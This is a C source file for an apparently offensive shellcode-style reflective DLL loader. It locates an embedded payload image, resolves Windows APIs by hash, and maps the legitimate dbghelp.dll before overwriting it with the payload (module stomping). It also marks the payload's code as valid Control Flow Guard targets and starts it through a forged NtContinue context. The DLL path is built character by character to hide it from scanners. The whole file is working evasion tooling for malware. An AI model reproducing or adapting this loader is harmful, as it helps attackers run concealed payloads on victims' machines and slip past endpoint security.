#include "../includes/core.h"


#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

__attribute__((section(".text$B")))
static void handle_copy_sections(PVOID AllocatedAddress, PVOID DllAddress, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	picMemcpy(AllocatedAddress, DllAddress, OPT_HEADER(DllAddress)->SizeOfHeaders);

	((PIMAGE_NT_HEADERS)((PBYTE)AllocatedAddress + DOS_HEADER(AllocatedAddress)->e_lfanew))->OptionalHeader.ImageBase = (ULONG_PTR)AllocatedAddress;

	for (DWORD i = 0; i < numSections; i++) {
	    picMemcpy(
	        (PBYTE)AllocatedAddress + sec[i].VirtualAddress,
	        (PBYTE)DllAddress + sec[i].PointerToRawData,
	        sec[i].SizeOfRawData
	    );

	    if (sec[i].Misc.VirtualSize > sec[i].SizeOfRawData) {
	        picMemset(
	            (PBYTE)AllocatedAddress + sec[i].VirtualAddress + sec[i].SizeOfRawData,
	            0,
	            sec[i].Misc.VirtualSize - sec[i].SizeOfRawData
	        );
	    }
	}
}

__attribute__((section(".text$B")))
static void handle_reloc_sections(PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY relocDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (!relocDir->VirtualAddress)
		return;

	ULONG_PTR delta = (ULONG_PTR)AllocatedAddress - OPT_HEADER(DllAddress)->ImageBase;
	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)AllocatedAddress + relocDir->VirtualAddress);

	while (reloc->VirtualAddress) {
		DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		PWORD entries = (PWORD)(reloc + 1);

		for (DWORD i = 0; i < numEntries; i++) {
			WORD type   = entries[i] >> 12;
			WORD offset = entries[i] & 0x0FFF;

			if (type == IMAGE_REL_TYPE) {
				ULONG_PTR *patch = (ULONG_PTR *)((PBYTE)AllocatedAddress + reloc->VirtualAddress + offset);
				*patch += delta;
			}
		}

		reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
	}
}

__attribute__((section(".text$B")))
static void handle_iat_section(Loader *loader, PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY importDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (!importDir->VirtualAddress)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, AllocatedAddress, importDir->VirtualAddress);

	for (; pImportDesc->Name != 0; ++pImportDesc) {
		PCHAR ImportName = RVA2VA(PCHAR, AllocatedAddress, pImportDesc->Name);
		HMODULE ModuleImport = loader->Funcs.LoadLibraryA(ImportName);

		PIMAGE_THUNK_DATA OrgTd = RVA2VA(PIMAGE_THUNK_DATA, AllocatedAddress, pImportDesc->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstTd = RVA2VA(PIMAGE_THUNK_DATA, AllocatedAddress, pImportDesc->FirstThunk);

		for (; OrgTd->u1.AddressOfData != 0; ++OrgTd, ++FirstTd) {
			if (IMAGE_SNAP_BY_ORDINAL(OrgTd->u1.Ordinal)) {
				FirstTd->u1.Function = (ULONG_PTR)loader->Funcs.GetProcAddress(ModuleImport, (LPCSTR)IMAGE_ORDINAL(OrgTd->u1.Ordinal));
			} else {
				PIMAGE_IMPORT_BY_NAME pImportName = RVA2VA(PIMAGE_IMPORT_BY_NAME, AllocatedAddress, OrgTd->u1.AddressOfData);
				FirstTd->u1.Function = (ULONG_PTR)loader->Funcs.GetProcAddress(ModuleImport, pImportName->Name);
			}
		}
	}
}

__attribute__((section(".text$B")))
static DWORD SectionCharsToProt(DWORD chars) {
	DWORD exec  = chars & IMAGE_SCN_MEM_EXECUTE;
	DWORD read  = chars & IMAGE_SCN_MEM_READ;
	DWORD write = chars & IMAGE_SCN_MEM_WRITE;

	if (exec && read && write) return PAGE_EXECUTE_READWRITE;
	if (exec && read)          return PAGE_EXECUTE_READ;
	if (exec && write)         return PAGE_EXECUTE_WRITECOPY;
	if (exec)                  return PAGE_EXECUTE;
	if (read && write)         return PAGE_READWRITE;
	if (read)                  return PAGE_READONLY;
	if (write)                 return PAGE_WRITECOPY;
	return PAGE_NOACCESS;
}

__attribute__((section(".text$B")))
static void handle_mem_perms(Loader *loader, PVOID AllocatedAddress, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	for (DWORD i = 0; i < numSections; i++) {
		PVOID secMemory = (PBYTE)AllocatedAddress + sec[i].VirtualAddress;
		SIZE_T secSize = sec[i].SizeOfRawData;
		ULONG old = 0;

		DWORD Prot = SectionCharsToProt(sec[i].Characteristics);
		DO_SYSCALL(loader->Funcs.NtProtectVirtualMemory, CurrentProcess(), &secMemory, &secSize, Prot, &old);
	}

	loader->Funcs.NtFlushInstructionCache(CurrentProcess(), NULL, 0);
}

__attribute__((section(".text$B")))
static void handle_tls_callbacks(PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY tlsDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (!tlsDir->VirtualAddress)
		return;

	PIMAGE_TLS_DIRECTORY tls = RVA2VA(PIMAGE_TLS_DIRECTORY, AllocatedAddress, tlsDir->VirtualAddress);
	PIMAGE_TLS_CALLBACK *callbacks = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;

	if (callbacks) {
		for (; *callbacks; ++callbacks)
			(*callbacks)(AllocatedAddress, DLL_PROCESS_ATTACH, NULL);
	}
}

__attribute__((section(".text$B")))
static void handle_register_unwind(Loader *loader, PVOID AllocatedAddress, PVOID DllAddress) {
	PIMAGE_DATA_DIRECTORY excDir = &OPT_HEADER(DllAddress)->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (!excDir->VirtualAddress || !excDir->Size)
		return;

	loader->Funcs.RtlAddFunctionTable(
		RVA2VA(PRUNTIME_FUNCTION, AllocatedAddress, excDir->VirtualAddress),
		excDir->Size / sizeof(RUNTIME_FUNCTION),
		(ULONG_PTR)AllocatedAddress
	);
}

typedef struct _CFG_TARGET_INFO {
	ULONG_PTR Offset;
	ULONG_PTR Flags;
} CFG_TARGET_INFO;

#define CFG_CALL_TARGET_VALID 0x00000001

__attribute__((section(".text$B")))
static void handle_cfg_targets(PVOID AllocatedAddress, PIMAGE_SECTION_HEADER sec, WORD numSections) {
	HMODULE kbase = (HMODULE)GetModule(KERNELBASE_HASH);
	if (!kbase)
		return;

	BOOL (WINAPI *SetTargets)(HANDLE, PVOID, SIZE_T, ULONG, CFG_TARGET_INFO *) =
		(BOOL (WINAPI *)(HANDLE, PVOID, SIZE_T, ULONG, CFG_TARGET_INFO *))GetProc(kbase, SETPROCESSVALIDCALLTARGETS_HASH);
	if (!SetTargets)
		return;

	for (DWORD i = 0; i < numSections; i++) {
		if (!(sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
			continue;

		SIZE_T vsize = sec[i].Misc.VirtualSize;
		if (!vsize)
			continue;

		PVOID base = (PBYTE)AllocatedAddress + sec[i].VirtualAddress;

		for (SIZE_T off = 0; off < vsize; off += 64 * 16) {
			CFG_TARGET_INFO info[64];
			ULONG n = 0;

			for (SIZE_T o = off; o < vsize && n < 64; o += 16) {
				info[n].Offset = o;
				info[n].Flags  = CFG_CALL_TARGET_VALID;
				n++;
			}

			SetTargets(CurrentProcess(), base, vsize, n, info);
		}
	}
}

__attribute__((section(".text$B")))
BOOL loaderEntry(PVOID location, ULONG_PTR asmSavedRsp) {
	PVOID DllAddress       = NULL;
	HANDLE hFile           = NULL;
	HANDLE hSection 	   = NULL;
	PVOID  pBase    	   = NULL;
	SIZE_T viewSize        = 0;
	DWORD  textSectionSize = 0;
	Loader loader          = {0};

	UCHAR *scan = (UCHAR *)location;

	while (TRUE) {
	    if (scan[0] == 'M' && scan[1] == 'Z') {
	        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)scan;
	        if (dos->e_lfanew < 0x400) {
	            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(scan + dos->e_lfanew);
	            if (nt->Signature == IMAGE_NT_SIGNATURE) {
	                DllAddress = (PVOID)scan;
	                break;
	            }
	        }
	    }
	    scan++;
	}

	loader.Modules.ntdll                  = GetModule(NTDLL_HASH);
	loader.Modules.kernel32               = GetModule(KERNEL32_HASH);
	loader.Funcs.NtProtectVirtualMemory   = GetProc(loader.Modules.ntdll,    NTPROTECTVIRTUALMEMORY_HASH);
	loader.Funcs.NtFlushInstructionCache  = GetProc(loader.Modules.ntdll,    NTFLUSHINSTRUCTIONCACHE_HASH);
	loader.Funcs.GetProcAddress           = GetProc(loader.Modules.kernel32, GETPROCADDRESS_HASH);
	loader.Funcs.LoadLibraryA             = GetProc(loader.Modules.kernel32, LOADLIBRARYA_HASH);
	loader.Funcs.NtMapViewOfSection       = GetProc(loader.Modules.ntdll,    NTMAPVIEWOFSECTION_HASH);
	loader.Funcs.NtCreateSection          = GetProc(loader.Modules.ntdll,    NTCREATESECTION_HASH);
	loader.Funcs.NtContinue               = GetProc(loader.Modules.ntdll,    NTCONTINUE_HASH);
	loader.Funcs.RtlCaptureContext        = GetProc(loader.Modules.ntdll,    RTLCAPTURECONTEXT_HASH);
	loader.Funcs.RtlAddFunctionTable      = GetProc(loader.Modules.ntdll,    RTLADDFUNCTIONTABLE_HASH);
	loader.Funcs.CreateFileA			  = GetProc(loader.Modules.kernel32, CREATEFILEA_HASH);

	PIMAGE_SECTION_HEADER sec = SECTION_HEADER(DllAddress);
	WORD numSections          = FILE_HEADER(DllAddress)->NumberOfSections;


	CHAR dll[33];
	dll[0]  = 'C';  dll[1]  = ':';  dll[2]  = '\\';
	dll[3]  = 'W';  dll[4]  = 'i';  dll[5]  = 'n';
	dll[6]  = 'd';  dll[7]  = 'o';  dll[8]  = 'w';
	dll[9]  = 's';  dll[10] = '\\'; dll[11] = 'S';
	dll[12] = 'y';  dll[13] = 's';  dll[14] = 't';
	dll[15] = 'e';  dll[16] = 'm';  dll[17] = '3';
	dll[18] = '2';  dll[19] = '\\'; dll[20] = 'd';
	dll[21] = 'b';  dll[22] = 'g';  dll[23] = 'h';
	dll[24] = 'e';  dll[25] = 'l';  dll[26] = 'p';
	dll[27] = '.';  dll[28] = 'd';  dll[29] = 'l';
	dll[30] = 'l';  dll[31] = '\0';


	hFile = loader.Funcs.CreateFileA(dll, GENERIC_READ, FILE_SHARE_READ, 
	    NULL, OPEN_EXISTING, 0, NULL);
  	
	DO_SYSCALL(loader.Funcs.NtCreateSection, &hSection, SECTION_ALL_ACCESS,
	    NULL, NULL, PAGE_READONLY,
	    SEC_IMAGE, hFile);

	DO_SYSCALL(loader.Funcs.NtMapViewOfSection, hSection, CurrentProcess(),
	    &pBase, 0, 0,
	    NULL, &viewSize, 1, 0,
	    PAGE_READONLY);

	PVOID  protBase = pBase;
	SIZE_T protSize = viewSize;
	DWORD  old      = 0;

	DO_SYSCALL(loader.Funcs.NtProtectVirtualMemory,
	    CurrentProcess(),
	    &protBase,
	    &protSize,
	    PAGE_READWRITE,
	    &old
	);
	


	

	handle_copy_sections(pBase, DllAddress, sec, numSections);
	handle_reloc_sections(pBase, DllAddress);
	handle_iat_section(&loader, pBase, DllAddress);
	handle_mem_perms(&loader, pBase, sec, numSections);
	handle_cfg_targets(pBase, sec, numSections);
	handle_tls_callbacks(pBase, DllAddress);
	handle_register_unwind(&loader, pBase, DllAddress);

	CONTEXT context;
	loader.Funcs.RtlCaptureContext(&context);
	context.Rip = (ULONG_PTR)RVA2VA(PVOID, pBase, OPT_HEADER(DllAddress)->AddressOfEntryPoint);
	context.Rcx = (ULONG_PTR)pBase;
	context.Rdx = DLL_PROCESS_ATTACH;
	context.R8  = 0;
	context.R9  = 0;

	ULONG_PTR rsp = (context.Rsp - 0x2000) & ~0xFULL;
	rsp -= 8;
	context.Rsp = rsp;

	DO_SYSCALL(loader.Funcs.NtContinue, &context, FALSE);

	return TRUE;
}